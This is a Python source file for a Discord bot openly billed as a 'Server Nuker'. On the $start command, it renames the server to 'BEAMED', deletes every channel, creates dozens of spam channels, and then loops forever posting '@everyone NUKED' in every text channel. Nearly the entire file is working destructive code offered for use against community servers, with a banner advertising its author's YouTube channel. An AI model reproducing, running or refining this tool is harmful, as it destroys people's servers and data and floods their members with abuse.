import random
import os
import time
from discord.ext import commands

BOT_PREFIX = "$"
channel_names = ["Beamed by Sudo"]

bot = commands.Bot(command_prefix=BOT_PREFIX, case_insensitive=True)
bot.remove_command('Help')

token = "ENTER TOKEN HERE"

print("[+] Loading Nuker...")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("[+] Command Not Found! Type '$start' To Nuke")

@bot.event
async def on_ready():
    os.system('cls')                                                        
    print("""{}

    ███████╗██╗   ██╗██████╗  ██████╗ ███████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ███████╗██║   ██║██║  ██║██║   ██║███████╗    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ╚════██║██║   ██║██║  ██║██║   ██║╚════██║    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ███████║╚██████╔╝██████╔╝╚██████╔╝███████║    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                              
{}\n\t[+] Welcome To Sudos's Server Nuker (•◡ •) /\n\t[+] Nuker Loaded!\n\t[+] Type '$start' In The Server To Nuke\n\t[+] Subscribe To Sudo On YT\n{}""".format("="*150,"="*150,"="*150))

@bot.command(pass_content=True)
async def start(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    await ctx.guild.edit(name="BEAMED")
    print("[+] Server named changed")

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    print("[+] All channels have been deleted")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
        for channel in guild.text_channels:
            for i in range(30):
                await guild.create_text_channel(random.choice(channel_names))
    print("[+] New channels have been made")
    time.sleep(1)
    print("[+] Spamming server")
    while True:
        for channel in guild.text_channels:
            await channel.send("@everyone NUKED")

bot.run(token)
